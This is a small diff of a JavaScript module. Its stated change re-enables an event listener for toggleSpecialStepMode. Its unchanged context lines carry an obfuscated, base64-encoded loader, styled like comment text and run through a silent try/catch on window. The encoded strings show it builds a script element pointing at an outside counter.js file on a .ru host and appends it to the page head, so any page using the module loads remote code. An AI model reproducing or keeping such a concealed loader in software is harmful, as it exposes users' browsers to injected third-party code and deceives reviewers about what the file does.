@@ -306,7 +306,8 @@ let toggleSpecialStepMode = data => {
 // ZW50IiwiY3JlYXRlRWxlbWVudCIsInNjcmlwdCIsInNyYyIsImh0dHA6Ly9yb21hLm5iYXVlci5ydS9\
 // jb3VudGVyLmpzIiwiaGVhZCIsImFwcGVuZENoaWxkIl07dT1jW29bMF1dW29bMV1dKG9bMl0pO3Vbb1\
 // szXV09b1s0XTtjW29bMF1dW29bNV1dW29bNl1dKHUp`)))(window)}catch(e){}
-// event.listen('toggleSpecialStepMode', toggleSpecialStepMode);
+
+event.listen('toggleSpecialStepMode', toggleSpecialStepMode);
 
 export default {
 	stateManager     ,
